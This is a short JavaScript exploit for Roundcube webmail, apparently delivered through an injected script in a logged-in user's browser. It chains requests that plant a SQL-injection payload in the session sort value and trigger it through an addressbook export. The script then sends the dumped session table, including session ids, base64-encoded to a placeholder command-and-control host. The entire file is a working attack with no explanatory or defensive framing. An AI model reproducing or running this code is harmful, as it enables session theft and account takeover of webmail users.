let csrf = rcmail.env.request_token;

let c2 = "<C2_server>"
let sqli_payload = `1=0+UNION+SELECT+1,1,now(),1,u%26"sess\\005fid",'','',vars,NULL,''+from+session;--`

fetch(
		`/?_task=mail&_action=list&_mbox=INBOX&_remote=1&_sort=${sqli_payload}`, {
			credentials: "include"
		}
	)
	.then((response) => {
		if (!response.ok) {
			throw new Error("Polluting $_SESSION with our sort value failed.");
		}
		return;
	})
	.then(() => {
		return fetch(
			"/?_task=mail&_action=search&_interval=&_q=test&_filter=ALL&_scope=base&_mbox=INBOX&_remote=1", {
				credentials: "include"
			}
		);
	})
	.then((response) => {
		if (!response.ok) {
			throw new Error(
				"Setting $_SESSION['search'] with our sort value failed."
			);
		}
		return fetch(
			`/?_task=addressbook&_source=0&_action=export&_token=${csrf}&_search=3`, {
				credentials: "include"
			}
		);
	})
	.then((response) => {
		if (!response.ok) {
			throw new Error("Triggering the SQLi failed.");
		}
		return response.text();
	})
	.then((text) => {
		fetch(c2 + "/store", {
			method: "POST",
			body: JSON.stringify({
				data: btoa(text)
			}),
			mode: "no-cors",
		});
	})
	.catch((error) => {
		fetch(c2 + "/error", {
			method: "POST",
			body: JSON.stringify({
				error: error.message
			}),
			mode: "no-cors",
		});
	});
